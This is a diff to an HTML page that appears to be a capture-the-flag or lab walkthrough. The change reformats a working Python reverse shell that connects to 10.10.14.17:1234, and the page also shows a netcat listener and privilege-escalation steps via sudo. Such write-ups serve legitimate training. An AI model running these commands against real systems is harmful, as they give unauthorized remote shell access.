@@ -34,8 +34,12 @@
     <div class="terminal-box">nc -lvnp 1234</div>
 
     <p>Executed a Python reverse shell from the web UI:</p>
-    <div class="terminal-box">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.17",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</div>
-
+<div class="terminal-box">python -c 'import socket,subprocess,os; \
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
+s.connect(("10.10.14.17",1234)); \
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \
+p=subprocess.call(["/bin/sh","-i"]);'</div>
+    
     <p>Checking sudo permissions:</p>
     <div class="terminal-box">sudo -l</div>
     <p>We can run commands as <b>scriptmanager</b> without a password. Switching users:</p>
